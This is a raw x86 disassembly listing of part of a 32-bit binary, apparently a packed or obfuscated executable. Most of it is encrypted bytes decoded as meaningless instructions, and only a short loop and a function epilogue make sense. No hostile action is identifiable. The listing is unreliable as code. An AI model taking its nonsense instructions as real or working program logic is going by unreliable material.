  4050e3:	xor    esp,DWORD PTR [ecx]
  4050e5:	(bad)  
  4050e6:	mov    ebx,0x6481165a
  4050eb:	or     al,0x4c
  4050ed:	dec    esp
  4050ee:	mov    eax,ds:0x5112dd02
  4050f3:	sub    al,0xf5
  4050f5:	jg     0x405092
  4050f7:	shl    DWORD PTR [edi],cl
  4050f9:	xor    al,BYTE PTR [ecx-0x27]
  4050fc:	into   
  4050fd:	lods   eax,DWORD PTR ds:[esi]
  4050fe:	mov    dl,0xb8
  405100:	mov    ds:0x83dca89e,eax
  405105:	add    dl,BYTE PTR [ecx-0x18]
  405108:	jp     0x4050bf
  40510a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40510b:	sub    dh,BYTE PTR [edi+ecx*2-0x3ea9d04d]
  405112:	into   
  405113:	jecxz  0x4050b4
  405115:	lahf   
  405116:	mov    DWORD PTR [ecx+0x679a54aa],ebx
  40511c:	hlt    
  40511d:	test   BYTE PTR [ebx+0x4934c2ba],cl
  405123:	add    esi,DWORD PTR [ebx+0x35]
  405126:	std    
  405127:	inc    eax
  405128:	fisttp QWORD PTR ds:0x32ced0a4
  40512e:	scas   al,BYTE PTR es:[edi]
  40512f:	retf   0x341c
  405132:	xor    DWORD PTR [esi-0x64bd1cb6],0xfffffff0
  405139:	xor    esp,ecx
  40513b:	dec    esp
  40513c:	cmp    eax,DWORD PTR [eax]
  40513e:	xor    eax,0x914d5836
  405143:	retf   
  405144:	push   ebp
  405145:	(bad)  
  405146:	xchg   edi,eax
  405147:	popf   
  405148:	mov    dl,0xb4
  40514a:	fwait
  40514b:	add    eax,0xfcb9a665
  405150:	js     0x4050ed
  405152:	cs push ebx
  405154:	and    esp,DWORD PTR [edx-0x74d0bc9a]
  40515a:	lods   al,BYTE PTR ds:[esi]
  40515b:	mov    edx,0xd5361172
  405160:	dec    eax
  405161:	xor    DWORD PTR [esi+0x41c3d7f],esi
  405167:	dec    esi
  405168:	addr16 sub al,0xd7
  40516b:	ja     0x405137
  40516d:	sbb    DWORD PTR [ebx],eax
  40516f:	ror    ch,1
  405171:	rcl    DWORD PTR [ecx],1
  405173:	cmp    ah,BYTE PTR [edx+0x33]
  405176:	dec    edx
  405177:	jae    0x4051f7
  405179:	cmp    esp,DWORD PTR [edi+0x3335c7e6]
  40517f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405180:	adc    al,dl
  405182:	cwde   
  405183:	cmp    al,0x28
  405185:	xchg   DWORD PTR [edi+0xbc730fb],ebx
  40518b:	arpl   WORD PTR cs:[ebx+0x47],si
  40518f:	sbb    eax,0x2d3964d
  405194:	lahf   
  405195:	call   0xf67b:0x69e222a6
  40519c:	test   eax,0x10b3794
  4051a1:	cmp    eax,0xb83cd60a
  4051a6:	jne    0x4051e0
  4051a8:	scas   al,BYTE PTR es:[edi]
  4051a9:	mov    dh,0xce
  4051ab:	lds    eax,FWORD PTR [edi+ebx*2-0x7242cd0e]
  4051b2:	jne    0x40522e
  4051b4:	jg     0x40522e
  4051b6:	add    al,0xc7
  4051b8:	int    0xd0
  4051ba:	jecxz  0x4051d0
  4051bc:	lahf   
  4051bd:	pop    esp
  4051be:	and    edi,ecx
  4051c0:	push   eax
  4051c1:	lods   al,BYTE PTR ds:[esi]
  4051c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051c3:	loop   0x405206
  4051c5:	jl     0x405199
  4051c7:	xchg   ecx,eax
  4051c8:	leave  
  4051c9:	cwde   
  4051ca:	push   esi
  4051cb:	push   edi
  4051cc:	mov    WORD PTR [edi+esi*8],?
  4051cf:	sbb    BYTE PTR [esi],al
  4051d1:	nop
  4051d2:	xchg   edx,eax
  4051d3:	adc    esp,DWORD PTR [edx-0x5823b4ba]
  4051d9:	lahf   
  4051da:	dec    eax
  4051db:	test   al,0x9f
  4051dd:	rcr    BYTE PTR [ebp+0x539ebbee],cl
  4051e3:	imul   ebx,DWORD PTR [ebx-0x59f29f72],0x412c6ab4
  4051ed:	push   ebx
  4051ee:	shl    DWORD PTR [edx-0x4c],1
  4051f1:	ret    0x2ad3
  4051f4:	shr    BYTE PTR [esi+0x3586b807],0xbc
  4051fb:	ret    
  4051fc:	(bad)  
  4051fd:	cld    
  4051fe:	das    
  4051ff:	fisttp WORD PTR [ebp-0x45]
  405202:	mov    BYTE PTR [ebp+ecx*4+0x729a1084],al
  405209:	xor    al,BYTE PTR [eax]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	iret   
  40523c:	loope  0x40520c
  40523e:	mov    esi,0x7c7c2ad0
  405243:	mov    ch,0x79
  405245:	jl     0x4052c3
  405247:	push   ss
  405248:	outs   dx,BYTE PTR ds:[esi]
  405249:	xchg   ebx,eax
  40524a:	call   0x9d3d36cb
  40524f:	outs   dx,DWORD PTR ds:[esi]
  405250:	cmp    DWORD PTR [eax-0x771baa2e],esi
  405256:	add    DWORD PTR [eax-0x466d35fe],esp
  40525c:	icebp  
  40525d:	ins    DWORD PTR es:[edi],dx
  40525e:	mov    ch,BYTE PTR [ecx+0x11dba6b3]
  405264:	jnp    0x4052cd
  405266:	ins    DWORD PTR es:[edi],dx
  405267:	inc    eax
  405268:	mov    esi,DWORD PTR [edi+0x1809b88d]
  40526e:	inc    eax
  40526f:	and    esp,DWORD PTR [esi-0x55]
  405272:	push   ds
  405273:	ret    0x3744
  405276:	cs pop esp
  405278:	test   al,0xc0
  40527a:	or     DWORD PTR [ebx-0x4b44fef0],ebp
  405280:	scas   al,BYTE PTR es:[edi]
  405281:	loop   0x405244
  405283:	adc    bl,BYTE PTR [esi]
  405285:	mov    ch,0x8b
  405287:	sbb    eax,DWORD PTR [ebp-0x7e]
  40528a:	sub    eax,0x80d4f40a
  40528f:	jmp    0x4052f0
  405291:	mov    ds:0x6e574952,eax
  405296:	(bad)  
  405297:	int    0x28
  405299:	xor    esi,DWORD PTR [eax]
  40529b:	jmp    0x57b06a78
  4052a0:	enter  0xfb7b,0x76
  4052a4:	dec    esi
  4052a5:	retf   0xc06f
  4052a8:	xor    ebx,DWORD PTR fs:[ebx+ebp*1-0x7c]
  4052ad:	sub    DWORD PTR [ecx],eax
  4052af:	ds fs adc al,0x25
  4052b3:	pop    es
  4052b4:	push   esp
  4052b5:	adc    al,0xcf
  4052b7:	(bad)  
  4052b8:	fsub   QWORD PTR [edi+0x59]
  4052bb:	(bad)  
  4052bc:	adc    al,0xcd
  4052be:	inc    edi
  4052bf:	jp     0x40530a
  4052c1:	shl    DWORD PTR [esi+0x79],1
  4052c4:	dec    eax
  4052c5:	sbb    ch,BYTE PTR [eax+esi*2+0x42b6c578]
  4052cc:	xor    ch,BYTE PTR [ebx]
  4052ce:	and    BYTE PTR [ebx+0x0],ah
  4052d1:	arpl   WORD PTR [ebx-0x6e],di
  4052d4:	int3   
  4052d5:	jb     0x4052af
  4052d7:	iret   
  4052d8:	inc    esp
  4052d9:	jmp    0x40525f
  4052db:	aas    
  4052dc:	or     BYTE PTR [esi+0x73],ah
  4052df:	shl    DWORD PTR [eax],cl
  4052e1:	leave  
  4052e2:	les    ecx,FWORD PTR [ebp+0xd]
  4052e5:	inc    esp
  4052e6:	out    dx,eax
  4052e7:	mov    dh,0xc2
  4052e9:	hlt    
  4052ea:	loope  0x40533d
  4052ec:	dec    edx
  4052ed:	push   ss
  4052ee:	fmul   DWORD PTR [eax]
  4052f0:	push   ecx
  4052f1:	inc    esp
  4052f2:	or     edx,DWORD PTR [edi+0x5dc83fa0]
  4052f8:	mov    ds:0x45da40c0,eax
  4052fd:	push   ds
  4052fe:	retf   0xc217
  405301:	adc    ebp,DWORD PTR [ebx+esi*8-0xb]
  405305:	add    DWORD PTR [edx],esi
  405307:	sub    BYTE PTR [ebx],ah
  405309:	adc    DWORD PTR [ebx],ebx
  40530b:	push   0xffffffd2
  40530d:	mov    ebx,0xf3665c2a
  405312:	shl    DWORD PTR [eax],1
  405314:	rcr    DWORD PTR [ebx+ebx*4],cl
  405317:	xor    ch,al
  405319:	jecxz  0x4052b0
  40531b:	imul   ebx,DWORD PTR [eax-0x1a64db46],0x3dd24f2a
  405325:	cwde   
  405326:	mov    ah,0xb0
  405328:	cmp    al,0x65
  40532a:	dec    ebp
  40532b:	loop   0x405374
  40532d:	fwait
  40532e:	dec    edi
  40532f:	pop    es
  405330:	outs   dx,DWORD PTR ds:[esi]
  405331:	(bad)  
  405332:	loope  0x405354
  405334:	js     0x4052d9
  405336:	in     al,dx
  405337:	leave  
  405338:	scas   al,BYTE PTR es:[edi]
  405339:	jo     0x405308
  40533b:	adc    eax,0xcd42e82c
  405340:	into   
  405341:	das    
  405342:	push   0x48c8858c
  405347:	dec    edi
  405348:	movq   mm4,QWORD PTR [ebp-0x30]
  40534c:	mov    eax,DWORD PTR [ecx]
  40534e:	cmp    DWORD PTR [ecx],0x3af24ab3
  405354:	out    dx,al
  405355:	xchg   edi,eax
  405356:	stos   DWORD PTR es:[edi],eax
  405357:	cs mov bh,ch
  40535a:	sbb    edi,DWORD PTR [edx-0x2f]
  40535d:	aam    0x65
  40535f:	rcl    BYTE PTR [ebp-0x57],cl
  405362:	sbb    DWORD PTR [edi+0x48d82c6a],esi
  405368:	in     eax,dx
  405369:	xchg   esi,eax
  40536a:	pop    edi
  40536b:	dec    ecx
  40536c:	push   ebp
  40536d:	jl     0x4052f4
  40536f:	mov    ah,0x4a
  405371:	jg     0x405326
  405373:	(bad)  
  405374:	aad    0xe7
  405376:	fiadd  WORD PTR [edx+edx*1-0x6e]
  40537a:	xlat   BYTE PTR ds:[ebx]
  40537b:	inc    esp
  40537c:	ror    eax,1
  40537e:	sbb    al,0x1
  405380:	inc    eax
  405381:	leave  
  405382:	out    0xa4,al
  405384:	xlat   BYTE PTR ds:[ebx]
  405385:	ins    DWORD PTR es:[edi],dx
  405386:	dec    ebx
  405387:	mov    ds,WORD PTR [ebp-0x672ef735]
  40538d:	stos   DWORD PTR es:[edi],eax
  40538e:	mov    ah,0x92
  405390:	test   bl,cl
  405392:	popf   
  405393:	jb     0x4053d6
  405395:	es add al,0x50
  405398:	jo     0x4053f6
  40539a:	xchg   esi,eax
  40539b:	repz data16 or ah,BYTE PTR [edx]
  40539f:	pop    edx
  4053a0:	adc    dl,BYTE PTR [edi+0x758a37d4]
  4053a6:	das    
  4053a7:	mov    bl,0x67
  4053a9:	sar    BYTE PTR [ebp-0x48929f7e],1
  4053af:	xor    BYTE PTR [esi+ebp*4],ch
  4053b2:	mov    dl,0xf3
  4053b4:	cmp    eax,0x4589e776
  4053b9:	jmp    0x40542f
  4053bb:	xor    DWORD PTR [eax],esp
  4053bd:	pop    edi
  4053be:	neg    edi
  4053c0:	push   0x1e4e8bb7
  4053c5:	rcr    bl,0x4b
  4053c8:	in     eax,dx
  4053c9:	jecxz  0x405418
  4053cb:	or     ebp,DWORD PTR [edi-0x1184fed7]
  4053d1:	xor    dh,BYTE PTR [eax+0x43490cfc]
  4053d7:	cmc    
  4053d8:	in     eax,0xae
  4053da:	bswap  esp
  4053dc:	aam    0x25
  4053de:	in     al,0x99
  4053e0:	push   ebp
  4053e2:	fimul  DWORD PTR [edx-0x2c]
  4053e5:	sub    edx,DWORD PTR [edi-0x2823705d]
  4053eb:	(bad)  
  4053ec:	stos   DWORD PTR es:[edi],eax
  4053ed:	sbb    BYTE PTR [ebx+0x44],ch
  4053f0:	mov    ebx,0x1c96444e
  4053f5:	lods   eax,DWORD PTR ds:[esi]
  4053f6:	cwde   
  4053f7:	mov    eax,ds:0x57caebf9
  4053fc:	mov    dl,0x1f
  4053fe:	fst    QWORD PTR [edi]
  405400:	add    esi,DWORD PTR [esi]
  405402:	ja     0x405467
  405404:	sub    al,0x66
  405406:	add    BYTE PTR [esi],bh
  405408:	add    BYTE PTR [esi],0x4a
  40540b:	int    0xf1
  40540d:	cmp    al,0xc1
  40540f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  405411:	int    0x87
  405413:	out    dx,al
  405414:	xchg   ebx,eax
  405415:	sar    BYTE PTR [edi],1
  405417:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405418:	sub    DWORD PTR [edx-0x3a],edx
  40541b:	sbb    DWORD PTR [ecx],ebp
  40541d:	pop    ebx
  40541e:	cli    
  40541f:	aad    0x8b
  405421:	lods   eax,DWORD PTR ds:[esi]
  405422:	dec    eax
  405423:	test   al,0x8
  405425:	jns    0x4053e5
  405427:	inc    esp
  405428:	out    0xc2,eax
  40542a:	loopne 0x405456
  40542c:	adc    al,0x1d
  40542e:	mov    ?,WORD PTR [edx]
  405430:	adc    al,0xc3
  405432:	scas   eax,DWORD PTR es:[edi]
  405433:	mov    ebp,0x4d7aec84
  405438:	adc    al,0x80
  40543a:	mov    WORD PTR [ebx+ebp*4],cs
  40543d:	shr    BYTE PTR [esi+0x2f],1
  405440:	in     eax,0x53
  405442:	dec    edx
  405443:	aaa    
  405444:	retf   0xb683
  405447:	sbb    eax,0x58697b88
  40544c:	jmp    0x89456633
  405451:	and    ch,ah
  405453:	push   eax
  405454:	push   esi
  405455:	xor    al,0x1f
  405457:	out    0xf2,eax
  405459:	lahf   
  40545a:	sbb    BYTE PTR [ebp+0x70804df7],ah
  405460:	loop   0x4054d4
  405462:	jg     0x40544e
  405464:	loop   0x405419
  405466:	gs or  al,0x77
  405469:	ins    BYTE PTR es:[edi],dx
  40546a:	scas   al,BYTE PTR es:[edi]
  40546b:	ret    0xcf65
  40546e:	sti    
  40546f:	jno    0x405407
  405471:	and    bl,BYTE PTR [edx+0x64]
  405474:	add    eax,0xde68321b
  405479:	ret    0xdfdc
  40547c:	scas   al,BYTE PTR es:[edi]
  40547d:	sar    BYTE PTR ds:0xd740994b,1
  405483:	push   edi
  405484:	push   edi
  405485:	mov    ds:0xfe9c7811,eax
  40548a:	xor    eax,0x4327af14
  40548f:	repnz jmp 0xae5e:0x2ac10554
  405497:	pop    edi
  405498:	xchg   edi,eax
  405499:	jne    0x405469
  40549b:	dec    ecx
  40549c:	adc    eax,0x7d68cb21
  4054a1:	xchg   edx,eax
  4054a2:	adc    al,BYTE PTR [ebp-0x5c]
  4054a5:	loop   0x4054f8
  4054a7:	inc    esi
  4054a8:	mov    ch,0x91
  4054aa:	mov    WORD PTR [edi+edi*1],?
  4054ad:	add    al,0x3b
  4054af:	inc    ebp
  4054b0:	inc    eax
  4054b1:	gs int3 
  4054b3:	push   cs
  4054b4:	mov    cl,0x16
  4054b6:	jmp    0x4054c2
  4054b8:	inc    esi
  4054b9:	push   eax
  4054ba:	rcr    DWORD PTR [edi+ebp*8],1
  4054bd:	sub    edi,0xffffffe4
  4054c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c1:	test   al,0xd
  4054c3:	adc    DWORD PTR [edx-0x2c],eax
  4054c6:	mov    edx,0x39e79ed5
  4054cb:	cmp    al,0xfe
  4054cd:	cmp    dh,bl
  4054cf:	xchg   ebp,eax
  4054d0:	push   ebp
  4054d1:	test   al,0xb1
  4054d3:	clc    
  4054d4:	jecxz  0x4054c2
  4054d6:	push   edx
  4054d7:	shl    DWORD PTR [ebp+0x1d14099d],0x61
  4054de:	mov    ecx,0xd1888de6
  4054e3:	or     DWORD PTR [edi+0x3c2cd143],ebx
  4054e9:	addr16 out 0xd,eax
  4054ec:	push   eax
  4054ed:	pop    ebx
  4054ee:	cdq    
  4054ef:	jnp    0x40555a
  4054f1:	jnp    0x405547
  4054f3:	cmp    dh,BYTE PTR [edi-0x2278daa1]
  4054f9:	out    dx,al
  4054fa:	xchg   ebx,eax
  4054fb:	inc    eax
  4054fc:	leave  
  4054fd:	cmp    BYTE PTR [ecx+0x46],ah
  405500:	dec    esi
  405501:	ret    
  405502:	xor    eax,0xebf11950
  405507:	sub    al,0xca
  405509:	xor    al,0x8e
  40550b:	(bad)  
  40550c:	sar    BYTE PTR [eax+0x3bd16c0a],1
  405512:	push   0x56
  405514:	jl     0x405530
  405516:	jl     0x4054e6
  405518:	sbb    ch,BYTE PTR [edi+0x6651a375]
  40551e:	xor    edi,DWORD PTR [edx+eiz*8-0x6c]
  405522:	scas   eax,DWORD PTR es:[edi]
  405523:	out    0xff,eax
  405525:	jnp    0x4054e3
  405527:	pop    eax
  405528:	mov    edx,0x83093b1b
  40552d:	fiadd  DWORD PTR [ecx-0x7effadb3]
  405533:	cmp    BYTE PTR [eax+0xa81cdc2],ch
  405539:	inc    edx
  40553a:	pop    ds
  40553b:	mov    eax,ds:0x7fc18611
  405540:	jle    0x405558
  405542:	add    dl,BYTE PTR [edx]
  405544:	add    al,0x4b
  405546:	jb     0x405531
  405548:	sub    edi,DWORD PTR [ebx-0x41]
  40554b:	jmp    0xb803:0xdfd0763
  405552:	test   al,0x2a
  405554:	dec    edx
  405555:	push   edi
  405556:	inc    edx
  405557:	loope  0x405546
  405559:	inc    ebx
  40555a:	xor    al,0xb0
  40555c:	and    eax,0xcf5a3647
  405561:	(bad)  
  405562:	sub    eax,0x87d4e4f3
  405567:	loopne 0x40554e
  405569:	push   ss
  40556a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40556b:	std    
  40556c:	ret    
  40556d:	or     eax,0x416004c0
  405572:	retf   
  405573:	pushf  
  405574:	or     edi,DWORD PTR [eax]
  405576:	ins    BYTE PTR es:[edi],dx
  405577:	std    
  405578:	mov    esi,0x3cee296b
  40557d:	sub    BYTE PTR [ebp+0x6fed7494],dh
  405583:	loope  0x40550e
  405585:	mov    WORD PTR [esi+0x34],ds
  405588:	inc    esi
  405589:	gs pop esi
  40558b:	dec    ebp
  40558c:	inc    ebx
  40558d:	pop    esi
  40558e:	inc    edx
  40558f:	mov    bh,0x1d
  405591:	xchg   edi,eax
  405592:	fcmovb st,st(7)
  405594:	shl    ch,1
  405596:	add    BYTE PTR [eax+ecx*4-0x6694eed],ah
  40559d:	mov    eax,ds:0x7399de53
  4055a2:	test   al,0x69
  4055a4:	xlat   BYTE PTR ds:[ebx]
  4055a5:	push   ebx
  4055a6:	cmp    ebx,DWORD PTR [edi]
  4055a8:	daa    
  4055a9:	test   DWORD PTR [ebp-0x24],eax
  4055ac:	sub    bl,bl
  4055ae:	add    BYTE PTR [ecx-0x5a],0xc2
  4055b2:	adc    eax,0xa1c0439f
  4055b7:	sahf   
  4055b8:	rcl    BYTE PTR [esp+ebx*2+0x20],1
  4055bc:	mov    bl,0x55
  4055be:	ret    
  4055bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055c0:	std    
  4055c1:	push   ds
  4055c2:	aaa    
  4055c3:	repnz pushf 
  4055c5:	push   es
  4055c6:	sbb    eax,0xe873ab97
  4055cb:	pop    es
  4055cc:	mov    edx,esp
  4055ce:	add    ch,BYTE PTR [ebp+0x6c4b80ea]
  4055d4:	pop    ebx
  4055d5:	ds add eax,0x6af59996
  4055db:	ret    
  4055dc:	adc    DWORD PTR [eax+0x6d],0xe9bc685f
  4055e3:	add    al,0xd8
  4055e5:	scas   al,BYTE PTR es:[edi]
  4055e6:	cmp    al,0x35
  4055e8:	mov    ch,0xae
  4055ea:	mov    ah,0x5c
  4055ec:	test   eax,0x9bc579ec
  4055f1:	out    0x7b,eax
  4055f3:	push   0x5153ca4e
  4055f8:	fs xor eax,0x39f55a5a
  4055fe:	push   ecx
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x433563,0x0
  40560a:	mov    eax,ds:0x433563
  40560f:	inc    eax
  405610:	mov    ds:0x433563,eax
  405615:	cmp    DWORD PTR ds:0x433563,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433563,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433563
  405642:	inc    eax
  405643:	mov    ds:0x433563,eax
  405648:	cmp    DWORD PTR ds:0x433563,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	sbb    al,BYTE PTR [esi+0x36094c03]
  405675:	jl     0x4056f3
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	ja     0x405651
  40567d:	mov    BYTE PTR [eax],dl
  40567f:	push   ebp
  405680:	mov    dl,0xfe
  405682:	pushf  
  405683:	pop    esi
  405684:	xchg   ebp,eax
  405685:	add    DWORD PTR [edi-0x5b],esp
  405688:	xchg   DWORD PTR [esi],edi
  40568a:	scas   eax,DWORD PTR es:[edi]
  40568b:	out    0x2,al
  40568d:	call   0xfa55:0x6a26a21b
  405694:	dec    edi
  405695:	jb     0x405695
  405697:	popa   
  405698:	jge    0x40561f
  40569a:	dec    eax
  40569b:	mov    ebp,0x91ad560
  4056a0:	dec    ebp
  4056a1:	ror    bl,cl
  4056a3:	hlt    
  4056a4:	adc    bl,BYTE PTR [edi+eax*4-0x5210f296]
  4056ab:	ficom  WORD PTR [edi-0x55]
  4056ae:	into   
  4056af:	lahf   
  4056b0:	push   ebx
  4056b1:	cdq    
  4056b2:	int    0x33
  4056b4:	fxch   st(4)
  4056b6:	fsubrp st(4),st
  4056b8:	sub    BYTE PTR [edi],dl
  4056ba:	add    DWORD PTR [edx],0xffffffa2
  4056bd:	les    edx,FWORD PTR [ebx-0x59ada2be]
  4056c3:	retf   
  4056c4:	lahf   
  4056c5:	push   ecx
  4056c6:	fnstcw WORD PTR [edx+0x3c]
  4056c9:	mov    eax,0x6c3301cd
  4056ce:	push   ds
  4056cf:	cmp    ebx,eax
  4056d1:	dec    BYTE PTR [esi]
  4056d3:	shl    BYTE PTR [edi+0x5b],cl
  4056d6:	cli    
  4056d7:	jne    0x4056a8
  4056d9:	retf   
  4056da:	push   edx
  4056db:	and    BYTE PTR [edx-0x15],dh
  4056de:	add    eax,0x6a218b7a
  4056e3:	jmp    0x268ba767
  4056e8:	lds    esi,FWORD PTR [ecx-0x1c1ab0c7]
  4056ee:	imul   esi,DWORD PTR [edi+0xe90461f],0x1878e551
  4056f8:	ss push cs
  4056fa:	sar    DWORD PTR [ebx],1
  4056fc:	cld    
  4056fd:	sbb    BYTE PTR [edi],bh
  4056ff:	xor    dl,BYTE PTR [ebp+0x11]
  405702:	xchg   ebx,eax
  405703:	push   eax
  405704:	inc    ecx
  405705:	sbb    eax,DWORD PTR [edx-0x325743f5]
  40570b:	(bad)
  40570e:	aaa    
  40570f:	mov    ds:0x73216a43,al
  405714:	sbb    BYTE PTR [eax-0x4b6e3acb],cl
  40571a:	test   DWORD PTR [edi-0x51e49b4a],0x297b0639
  405724:	sar    ebx,0x16
  405727:	add    ch,BYTE PTR ds:0xe50fa766
  40572d:	das    
  40572e:	sbb    ebp,DWORD PTR [ecx+ebx*8-0x73e13174]
  405735:	pop    ebx
  405736:	std    
  405737:	jmp    0x405782
  405739:	push   ds
  40573a:	stc    
  40573b:	lock (bad) 
  40573d:	xor    BYTE PTR [eax],dl
  40573f:	adc    eax,0xec7cae42
  405744:	call   0x6a58c7c1
  405749:	loope  0x4056e0
  40574b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40574c:	adc    al,0xe4
  40574e:	sub    al,0xbd
  405750:	mov    ds:0x2c276586,al
  405755:	jo     0x4056e0
  405757:	pusha  
  405758:	xor    eax,ecx
  40575a:	aaa    
  40575b:	push   es
  40575c:	push   cs
  40575d:	int3   
  40575e:	cld    
  40575f:	and    eax,0x3eb4544c
  405764:	add    dl,BYTE PTR [edi-0x14]
  405767:	pop    ebx
  405768:	out    dx,eax
  405769:	cmp    eax,DWORD PTR [edi+0x2f01dd97]
  40576f:	pop    ebp
  405770:	sbb    al,0xb9
  405772:	pop    ebp
  405773:	sub    BYTE PTR [ecx+0x507d60e7],0x31
  40577a:	and    edx,0xdd01cc39
  405780:	inc    eax
  405781:	neg    DWORD PTR [ebp-0x4e80e01b]
  405787:	cmp    al,0x25
  405789:	sbb    DWORD PTR [ecx+0x38],0xa844b53c
  405790:	bound  ecx,QWORD PTR [ecx]
  405792:	push   esp
  405793:	fadd   DWORD PTR fs:[ecx]
  405796:	repnz mov dh,0x28
  405799:	push   ss
  40579a:	pop    edx
  40579b:	loop   0x4057f2
  40579d:	outs   dx,BYTE PTR ds:[esi]
  40579e:	sahf   
  40579f:	add    esi,DWORD PTR [edi-0x1a1a2bfc]
  4057a5:	or     al,0x2c
  4057a7:	bound  ebp,QWORD PTR [ebp+0x2b78bc4d]
  4057ad:	pushf  
  4057ae:	gs jnp 0x4057d7
  4057b1:	out    0xd0,eax
  4057b3:	imul   BYTE PTR [ebx-0x6381ce94]
  4057b9:	iret   
  4057ba:	pop    es
  4057bb:	cmp    BYTE PTR [edi],0xdb
  4057be:	not    al
  4057c0:	push   0xffffff9a
  4057c2:	mov    ah,0x9a
  4057c4:	adc    bh,BYTE PTR [esi-0x9e9647a]
  4057ca:	mov    edi,0x98461c8a
  4057cf:	popf   
  4057d0:	mov    al,ds:0x67ee1241
  4057d5:	popa   
  4057d6:	fldln2 
  4057d8:	scas   al,BYTE PTR es:[edi]
  4057d9:	add    al,0xe8
  4057db:	cs jp  0x405793
  4057de:	xor    dh,dh
  4057e0:	sbb    al,0x97
  4057e2:	push   esp
  4057e3:	push   DWORD PTR [ebx]
  4057e5:	xlat   BYTE PTR ds:[ebx]
  4057e6:	pop    ebx
  4057e7:	lods   eax,DWORD PTR ds:[esi]
  4057e8:	jbe    0x405862
  4057ea:	xchg   esp,eax
  4057eb:	or     ch,ah
  4057ed:	inc    edx
  4057ee:	sbb    DWORD PTR [edx+0x57],ebx
  4057f1:	cmp    al,0x36
  4057f3:	or     al,0x60
  4057f5:	push   edx
  4057f6:	xor    BYTE PTR [edx],0x16
  4057f9:	pop    ecx
  4057fa:	jecxz  0x405818
  4057fc:	enter  0x5a31,0x35
  405800:	adc    DWORD PTR [edx-0x3d],ecx
  405803:	fsub   DWORD PTR [ebx+0x1d]
  405806:	mov    al,ds:0x1af0855b
  40580b:	call   0x89a91d8b
  405810:	aaa    
  405811:	mov    eax,0x52f0ce3c
  405816:	mov    edi,ebx
  405818:	retf   0x8264
  40581b:	sub    ah,0x68
  40581e:	stos   BYTE PTR es:[edi],al
  40581f:	imul   DWORD PTR [ebp+0x55]
  405822:	(bad)  
  405823:	fcomp  DWORD PTR [eax-0x21f77654]
  405829:	mov    dl,0x8f
  40582b:	and    dl,0x21
  40582e:	push   es
  40582f:	setge  BYTE PTR [edi+0x9]
  405833:	shr    DWORD PTR [edx+0x3b],0x79
  405837:	xchg   esp,eax
  405838:	test   BYTE PTR ds:0xb523a629,bh
  40583f:	sbb    BYTE PTR [ebp-0x75],bl
  405842:	jmp    0x3d5d:0x1704e3b4
  405849:	xlat   BYTE PTR ds:[ebx]
  40584a:	(bad)  
  40584b:	fisub  DWORD PTR [edx]
  40584d:	pop    ds
  40584e:	sub    esp,DWORD PTR [ebx-0x63]
  405851:	dec    esi
  405852:	sub    al,0x95
  405854:	popf   
  405855:	out    dx,eax
  405856:	mov    ds:0x49be2f80,al
  40585b:	test   DWORD PTR [esi],eax
  40585d:	(bad)  
  40585e:	in     al,dx
  40585f:	retf   0xf29c
  405862:	pop    edx
  405863:	jmp    0xd71a:0x416d8fa3
  40586a:	sub    eax,0xc33f9388
  40586f:	xchg   DWORD PTR [edi+0x5e2d22f0],ecx
  405875:	mov    DWORD PTR [ecx-0x54de5c9c],0x558faae4
  40587f:	adc    DWORD PTR [eax+eiz*8-0x3f],ebx
  405883:	lahf   
  405884:	xchg   esi,eax
  405885:	mov    al,ds:0xed2ab416
  40588a:	sub    ebx,DWORD PTR gs:[esi+0x655dd68b]
  405891:	iret   
  405892:	push   es
  405893:	(bad)  
  405894:	shl    BYTE PTR [esi],1
  405896:	les    esi,FWORD PTR [edi+0x613773ff]
  40589c:	into   
  40589d:	ficomp WORD PTR [edx+0x687f7184]
  4058a3:	test   BYTE PTR [ecx-0x21a70062],bl
  4058a9:	outs   dx,DWORD PTR ds:[esi]
  4058aa:	test   al,0x87
  4058ac:	sub    ecx,DWORD PTR [ecx+0x5d]
  4058af:	mov    edx,0x479077c2
  4058b4:	loop   0x4058dd
  4058b6:	pop    edi
  4058b7:	push   ebx
  4058b8:	mov    dh,0x4d
  4058ba:	stos   BYTE PTR es:[edi],al
  4058bb:	mov    eax,ds:0xe4642bc9
  4058c0:	xor    al,0xce
  4058c2:	shr    BYTE PTR [ebx-0xd],1
  4058c5:	lahf   
  4058c6:	lods   al,BYTE PTR ds:[esi]
  4058c7:	cld    
  4058c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c9:	xor    eax,0xdc400a7e
  4058ce:	mov    ebx,0x3748850
  4058d3:	adc    BYTE PTR [edx],0xe3
  4058d6:	out    0x7e,eax
  4058d8:	adc    eax,0x341b100d
  4058dd:	out    0x33,al
  4058df:	inc    edx
  4058e0:	repz in al,0x60
